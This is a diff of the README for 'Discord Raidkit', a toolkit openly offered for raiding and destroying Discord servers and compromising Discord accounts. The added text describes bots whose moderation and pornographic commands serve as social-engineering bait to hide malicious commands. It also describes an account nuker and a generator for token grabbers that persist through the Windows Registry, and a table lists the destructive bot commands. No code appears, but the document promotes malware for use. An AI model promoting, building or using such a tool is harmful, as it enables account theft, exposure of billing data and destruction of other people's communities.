@@ -12,20 +12,16 @@
 
 Discord Raidkit is an open-source, forever free tool that allows you to raid and destroy Discord servers via Discord bots, compromise Discord accounts, and generate Discord token grabbers.
 
-![Discord Raidkit v2.4.0 Image](https://user-images.githubusercontent.com/98130822/234115079-195cbee2-2acf-4b86-9151-b715babad9e8.png)
+![Discord Raidkit v2.4.2 Console](https://user-images.githubusercontent.com/98130822/235321378-f624a5ba-5ff6-4f80-b37e-8a1691724c53.png)
 
-## Why use Discord Raidkit over any other tool? Here's 5 reasons!
+## Tools
 
-- **Developed for social engineering** - both bots have non-malicious slash commands, such as a moderation and NSFW suite (10000+ images!).
+- **Anubis** is a Discord bot with [nine malicious commands](#malicious-bot-commands). However, unlike other nuking tools, Anubis also has several non-malicious slash commands, including a moderation suite, to help you convince server administration to add the bot.
 
-- **Asynchronous optimisation** - many tools work synchronously, one request at a time — we don't do things like that here.
+- **Qetesh** is a Discord bot with [nine malicious commands](#malicious-bot-commands). However, Qetesh also has 25 NSFW slash commands for the most popular pornographic kinks, at least according to PornHub. These commands should help take advantage of the degeneracy of Discord users.
 
-- **Ease of use** - you can download this toolkit as a single executable, so there's no need to install Python or mess around with npm.
-
-- **Maintained** - the first commit to this repository was made August 3rd, 2020, nearly three years ago. We evolve with discord.py, and Python. 
-
-- **Professionally written** - this tool is written by a real software developer, and it's quite easy to tell!
-
+- **Osiris** is the account manager of Discord Raidkit. Using Osiris, you can save the information of an account, login to an account using either Chrome, Firefox, or Microsoft Edge, or you can fully nuke an account, deleting channels, guilds, friends, and connections, deauthorizing applications, removing hype squad, and PATCHing various account settings. You can also generate Discord token grabbers within Windows Registry support. As of v2.4.2, Osiris supports proxies (**proxies currently beta; awaiting feedback**).
+ 
 ## Installation
 
 1. Head over to [the latest release](https://github.com/the-cult-of-integral/discord-raidkit/releases/latest).
@@ -34,15 +30,7 @@ Discord Raidkit is an open-source, forever free tool that allows you to raid and
 
 ---
 
-## Tools summary
-
-- **Anubis** is a Discord bot with several working moderation features, such as a raid prevention database that can be expanded by a server owner, and moderation slash commands. However, beneath the surface, lay several malicious commands only accessible by the bot owner.
-
-- **Qetesh** is a Discord bot with 25 NSFW commands, supporting over 10000+ NSFW images of the most popular porn-tags according to PornHub, plus some others. Like Anubis, there are also several hidden, malicious commands.
-
-- **Osiris** is a Discord account nuker that also allows you to login to an account and to view its information, such as billing addresses. There is also an inbuilt, improved token grabber that will allow itself to enter a Windows registry if ran.
-
-## Bot commands (for Anubis/Qetesh)
+## Malicious bot commands
 
 |Command|Aliases|Parameters|Brief Description|
 |-|-|-|-|
@@ -59,7 +47,7 @@ Discord Raidkit is an open-source, forever free tool that allows you to raid and
 | mass_leave | massleave, leave_all, leaveall | --- | Leave every server. |
 | close | --- | --- | Close a bot and return to the main menu. |
 
-## Account actions (for Osiris)
+## Osiris actions
 
 |Action|Brief Description|
 |-|-|
